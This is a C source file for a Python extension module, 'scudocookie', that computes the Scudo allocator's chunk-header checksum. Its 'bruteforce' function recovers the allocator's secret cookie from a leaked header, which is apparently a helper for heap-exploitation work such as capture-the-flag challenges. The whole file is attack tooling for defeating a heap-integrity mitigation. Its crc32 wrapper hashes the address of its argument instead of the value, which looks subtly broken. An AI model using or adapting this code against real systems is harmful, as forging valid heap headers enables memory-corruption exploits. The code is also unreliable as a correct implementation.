#define PY_SSIZE_T_CLEAN
#include <Python.h>

#include <sys/types.h>
#include <stdio.h>

#define CRC32_(crc, value)                                                     \
  ({                                                                           \
    __asm__("crc32\t"                                                          \
            "(%1), %0"                                                         \
            : "=r"(crc)                                                        \
            : "r"(value), "0"(crc));                                           \
  })

static u_int32_t crc32(u_int32_t crc, void *buf) {
        size_t crc0 = crc;
        CRC32_(crc0, &buf);
        return crc0;
}

static unsigned int _calc_checksum(unsigned int cookie, unsigned long address, unsigned long header) {
        unsigned int _crc = 0;
        unsigned int step1 = 0;
        unsigned int step2 = 0;
        _crc = crc32(cookie, address);
        step1 = _crc;
        _crc = crc32(_crc, header);
        step2 = _crc;
        _crc = _crc ^ (_crc >> 16);

        return _crc;
}


static PyObject * bruteforce_headerleak(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int checksum;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &checksum, &header))
                return NULL;
        unsigned int cookie = 0;
        unsigned int _crc = 0;

        while (_crc != checksum) {
                ++cookie;
                _crc = _calc_checksum(cookie, address, header);
        }

        return PyLong_FromLong(cookie);
}

static PyObject * calc_checksum(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int cookie;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &cookie, &header))
                return NULL;

        unsigned int _crc = 0;
        
        _crc = _calc_checksum(cookie, address, header);
        
        return PyLong_FromLong(_crc);
}


static PyMethodDef ScudoCookieMethods[] = {
    {"bruteforce", bruteforce_headerleak, METH_VARARGS,
     "Bruteforce the cookie from header leak."},
    {"calc_checksum", calc_checksum, METH_VARARGS,
     "Calculate the checksum for a header with the cookie."},
    {NULL, NULL, 0, NULL} /* Sentinel */
};

static struct PyModuleDef scudocookiemodule = {
    PyModuleDef_HEAD_INIT,
    "scudocookie",   /* name of module */
    NULL, /* module documentation, may be NULL */
    -1,       /* size of per-interpreter state of the module,
                 or -1 if the module keeps state in global variables. */
    ScudoCookieMethods
};

PyMODINIT_FUNC PyInit_scudocookie(void) {
        return PyModule_Create(&scudocookiemodule);
}
